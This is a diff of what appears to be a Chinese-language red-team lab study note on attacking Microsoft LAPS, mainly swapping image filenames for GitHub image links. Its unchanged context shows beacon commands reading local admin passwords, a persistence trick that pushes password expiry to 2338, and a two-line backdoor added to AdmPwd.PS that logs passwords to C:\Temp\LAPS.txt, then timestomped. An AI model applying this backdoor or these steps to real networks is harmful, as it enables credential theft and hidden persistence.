@@ -113,8 +113,8 @@ ValueData   : 1
 
 ```
 
-1661470790012.png
 
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661470790012.png)
 
 
 有LAPS的电脑一般预装了LAPS PowerShell cmdlets ，上面枚举到wkstn-1和wkstn-2两台电脑都有
@@ -272,8 +272,8 @@ ExpirationTimestamp : 8/28/2022 8:58:44 AM
 
 ```
 
-1661471925451.png
 
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661471925451.png)
 
  DEV\bfarmer不在上面三个组的任何一个，所以读取的时候密码是空的
 ```
@@ -301,11 +301,13 @@ ExpirationTimestamp : 8/28/2022 8:58:44 AM
 
 ```
 
-1661471899909.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661471899909.png)
 
 jking在DEV\1st Line Support组
 
-1661472073529.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661472073529.png)
 
 
 在WKSTN-2上make_token以后也可以看到密码
@@ -328,11 +330,13 @@ ExpirationTimestamp : 8/28/2022 8:58:44 AM
 
 ```
 
-1661472378476.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661472378476.png)
 
 但是在在WKSTN-1上make_token以后会报错，理论上应该也可以看到的，感觉lab不太稳定?
 
-1661472458881.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661472458881.png)
 
 
 使用上面得到的计算机密码，make_token，访问目标计算机
@@ -377,7 +381,8 @@ beacon> ls \\wkstn-2\c$
  1b       fil     07/16/2016 13:18:08   BOOTNXT
  256mb    fil     08/25/2022 23:21:22   pagefile.sys
 ```
-1661472563036.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661472563036.png)
 
 
 
@@ -425,7 +430,8 @@ fk43i9785W8Cw5
 
 ```
 
-1661473011405.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661473011405.png)
 
 
 # LAPS Persistence
@@ -491,8 +497,8 @@ ExpirationTimestamp : 2/11/2338 11:05:23 AM
 ```
 
 
-1661474217831.png
 
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661474217831.png)
 
 
 # LAPS Backdoors
@@ -519,13 +525,13 @@ beacon> ls
  33kb     fil     09/22/2016 08:02:08   AdmPwd.Utils.dll
 ```
 
-1661474490204.png
 
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661474490204.png)
 
 修改这个文件
 
-1661474660596.png
 
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661474660596.png)
 
 找到Main/AdmPwd.PS/Main.cs里的这个方法
 ```
@@ -546,23 +552,26 @@ public class GetPassword : Cmdlet
 }
 ```
 
-1661474867370.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661474867370.png)
 
 添加这两行代码,当操作获取密码的命令时，把当前密码写文件到```C:\Temp\LAPS.txt```
 ```
 var line = $"{pi.ComputerName} : {pi.Password}";
 System.IO.File.AppendAllText(@"C:\Temp\LAPS.txt", line);
 ```
-1661474940637.png
 
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661474940637.png)
 
 上面保存，编译生成一个AdmPwd.PS.dll文件
 
-1661475080201.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661475080201.png)
 
 替换源文件，这里如果报进程占用要kill掉进程或者重启计算机
 
-1661475846601.png
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661475846601.png)
 
 同步时间戳
 ```
@@ -586,8 +595,8 @@ beacon> ls
  33kb     fil     09/22/2016 08:02:08   AdmPwd.Utils.dll
 ```
 
-1661476576319.png
 
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661476576319.png)
 
 ```
 beacon> ls C:\Temp
